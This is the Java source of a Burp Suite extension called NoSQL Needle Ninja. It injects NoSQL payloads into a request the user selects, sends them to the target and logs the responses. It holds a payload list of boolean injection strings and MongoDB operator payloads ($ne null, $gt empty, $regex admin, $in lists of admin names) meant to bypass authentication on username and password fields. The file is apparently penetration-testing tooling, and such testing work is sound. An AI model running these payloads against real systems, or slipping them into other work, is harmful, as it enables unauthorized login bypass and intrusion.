import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.TableModel;
import javax.swing.table.TableRowSorter;
import java.awt.*;
import java.util.ArrayList;
import java.util.Comparator;

import static burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;

public class NNN implements BurpExtension {
    private static MontoyaApi api;
    private static ArrayList<Payload> payloadsArrayList = new ArrayList<>();
    static HttpResponse response;

    private JTextPane infoPane = new JTextPane();

    private void LoadPayloads() {
        // Fuzz String
        this.payloadsArrayList.add(new Payload(PayloadType.FUZZ_STRING, "'\"`{;$Foo}$Foo \\xYZ", null, null));

        // Boolean payloads
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("' && 0 && 'x"), "' && 0 && 'x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("' && 1 && 'x"), "' && 1 && 'x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" && 0 && x"), " && 0 && x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" && 1 && x"), " && 1 && x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("'||1|| '"), "'||1|| '", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" ||1|| "), " ||1|| ", null));

        // Payloads for username field
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("admin"), "admin", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $regex \":\" admin .*\"}"), "{\" $regex \":\" admin .*\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": \" foo \"}"), "{\" $ne \": \" foo \"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}"), "{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}", null));

        // Payloads for password field
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \":\" invalidpassword \"}"), "{\" $ne \":\" invalidpassword \"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": \" xd \"}"), "{\" $ne \": \" xd \"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));

        // Data extraction payloads have to be handled directly
    }

    public String urlEncodeData(String data) {
        return api.utilities().urlUtils().encode(data);
    }

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("NNN");
        api.logging().logToOutput("Extension NoSQL Needle Ninja (NNN) has been started");
        this.LoadPayloads();

        api.userInterface().registerContextMenuItemsProvider(new MyContextMenuItemsProvider(api));

        MyTableModel tableModel = new MyTableModel();
        api.userInterface().registerSuiteTab("NNN Logger", constructLoggerTab(tableModel));
        api.http().registerHttpHandler(new MyHttpHandler(tableModel));

//        api.userInterface().registerHttpRequestEditorProvider(new MyHttpRequestEditorProvider(api));


//        HttpHandler httpHandler = new MyHttpHandler();
//        api.http().registerHttpHandler(httpHandler);
    }

    private Component constructLoggerTab(MyTableModel tableModel)
    {
        // main split pane
        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        // tabs with request/response viewers
        JTabbedPane tabs = new JTabbedPane();

        UserInterface userInterface = api.userInterface();

        HttpRequestEditor requestViewer = userInterface.createHttpRequestEditor(READ_ONLY);
        HttpResponseEditor responseViewer = userInterface.createHttpResponseEditor(READ_ONLY);

        // new information pane
        this.infoPane.setEditable(false);
        this.infoPane.setText("NNN is waititng to start a test");
        JScrollPane infoScrollPane = new JScrollPane(this.infoPane);
        tabs.addTab("NNN Scan Information", infoScrollPane);

        tabs.addTab("Request", requestViewer.uiComponent());
        tabs.addTab("Response", responseViewer.uiComponent());

        splitPane.setRightComponent(tabs);

        // table of log entries
        JTable table = new JTable(tableModel)
        {
            @Override
            public void changeSelection(int rowIndex, int columnIndex, boolean toggle, boolean extend)
            {
                // show the log entry for the selected row
                HttpResponseReceived responseReceived = tableModel.get(rowIndex);
                requestViewer.setRequest(responseReceived.initiatingRequest());
                responseViewer.setResponse(responseReceived);

                super.changeSelection(rowIndex, columnIndex, toggle, extend);
            }
        };

        // Columns sizes
        table.getColumnModel().getColumn(0).setMaxWidth(50);
        table.getColumnModel().getColumn(1).setMaxWidth(90);
        table.getColumnModel().getColumn(4).setMaxWidth(90);
        table.getColumnModel().getColumn(5).setMaxWidth(90);

        // Create a custom TableRowSorter
        TableRowSorter<TableModel> sorter = new TableRowSorter<>(tableModel);

        // Set custom comparators for numeric sorting on the first and last columns
        sorter.setComparator(0, new Comparator<Object>() {
            @Override
            public int compare(Object o1, Object o2) {
                try {
                    int num1 = Integer.parseInt(o1.toString());
                    int num2 = Integer.parseInt(o2.toString());
                    return Integer.compare(num1, num2);
                } catch (NumberFormatException e) {
                    return o1.toString().compareTo(o2.toString());
                }
            }
        });

        sorter.setComparator(tableModel.getColumnCount() - 1, new Comparator<Object>() {
            @Override
            public int compare(Object o1, Object o2) {
                try {
                    int num1 = Integer.parseInt(o1.toString());
                    int num2 = Integer.parseInt(o2.toString());
                    return Integer.compare(num1, num2);
                } catch (NumberFormatException e) {
                    return o1.toString().compareTo(o2.toString());
                }
            }
        });

        table.setRowSorter(sorter);

        JScrollPane scrollPane = new JScrollPane(table);

        splitPane.setLeftComponent(scrollPane);

        return splitPane;
    }


    static void fuzzstringTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
        new Thread(() -> {
            try {
                HttpService httpService = requestResponse.request().httpService();
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.FUZZ_STRING) {
                        HttpRequestResponse response2receive;
                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                        if (request2send.method().equals("POST")) {
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            response2receive = api.http().sendRequest(request2send);
                        }
                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                    }
                }
            } catch (Exception e) {
                api.logging().logToOutput("[!] Request failed");
            }
        }).start();
    }

    static void booleanTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
        new Thread(() -> {
            try {
                HttpService httpService = requestResponse.request().httpService();
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.BOOLEAN) {
                        HttpRequestResponse response2receive;
                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                        if (request2send.method().equals("POST")) {
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            response2receive = api.http().sendRequest(request2send);
                        }
                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                    }
                }
            } catch (Exception e) {
                api.logging().logToOutput("[!] Request failed");
            }
        }).start();
    }

    static void authenticationUsernameTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
        new Thread(() -> {
            try {
                HttpService httpService = requestResponse.request().httpService();
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
                        HttpRequestResponse response2receive;
                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                        if (request2send.method().equals("POST")) {
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            response2receive = api.http().sendRequest(request2send);
                        }
                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                    }
                }
            } catch (Exception e) {
                api.logging().logToOutput("[!] Request failed");
            }
        }).start();
    }

    static void authenticationPasswordTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
        new Thread(() -> {
            try {
                HttpService httpService = requestResponse.request().httpService();
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
                        HttpRequestResponse response2receive;
                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                        if (request2send.method().equals("POST")) {
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            response2receive = api.http().sendRequest(request2send);
                        }
                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                    }
                }
            } catch (Exception e) {
                api.logging().logToOutput("[!] Request failed");
            }
        }).start();
    }


}
